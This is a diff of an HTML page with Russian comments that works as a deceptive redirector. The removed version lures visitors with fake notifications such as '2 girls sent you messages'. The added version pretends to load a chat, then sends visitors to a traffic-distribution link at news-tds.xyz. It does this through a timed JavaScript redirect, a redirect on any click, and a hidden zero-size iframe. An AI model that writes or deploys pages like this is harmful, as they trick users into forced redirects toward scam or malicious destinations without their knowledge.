@@ -4,81 +4,53 @@
 <meta charset="UTF-8">
 <title>Loading...</title>
 
-<!-- быстрый редирект -->
-<meta http-equiv="refresh" content="1;url=https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0">
-
 <style>
 body {
     margin: 0;
     background: #000;
     color: #fff;
-    font-family: Arial;
     text-align: center;
+    font-family: Arial;
 }
-.box {
+h1 {
     margin-top: 80px;
-}
-.btn {
-    background: red;
-    padding: 20px;
-    display: inline-block;
-    margin-top: 20px;
-    color: white;
-    font-weight: bold;
-    border-radius: 10px;
-}
-.popup {
-    position: fixed;
-    bottom: 10px;
-    left: 10px;
-    background: #222;
-    padding: 10px;
-    border-radius: 8px;
-    font-size: 12px;
 }
 </style>
 
 <script>
-// мгновенный JS редирект (дублирует meta)
-setTimeout(function(){
-    window.location.href = "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0";
-}, 800);
 
-// клик по всей странице
-document.onclick = function(){
-    window.location.href = "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0";
-};
-
-// фейковые уведомления
-let messages = [
-"Anna from your city is online 🔥",
-"2 girls sent you messages",
-"Someone is waiting for you...",
-"New private message received"
+// === СПИСОК ССЫЛОК (добавляй сюда) ===
+let links = [
+"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
+"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
+"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0"
 ];
 
-function showPopup() {
-    let msg = messages[Math.floor(Math.random() * messages.length)];
-    document.getElementById("popup").innerText = msg;
-}
+// случайная ссылка
+let randomLink = links[Math.floor(Math.random() * links.length)];
 
-setInterval(showPopup, 1500);
+// быстрый редирект
+setTimeout(function(){
+    window.location.href = randomLink;
+}, 400);
+
+// клик по странице
+document.addEventListener("click", function(){
+    window.location.href = randomLink;
+});
+
 </script>
 
 </head>
 
 <body>
 
-<div class="box">
-    <h1>🔥 3 GIRLS ARE WAITING</h1>
-    <p>Click anywhere to view messages</p>
+<h1>🔥 Loading chat...</h1>
 
-    <div class="btn">ENTER NOW</div>
-</div>
-
-<div id="popup" class="popup">
-Loading...
-</div>
+<!-- iframe (тоже рандом) -->
+<script>
+document.write('<iframe src="' + randomLink + '" width="0" height="0" style="display:none;"></iframe>');
+</script>
 
 </body>
 </html>
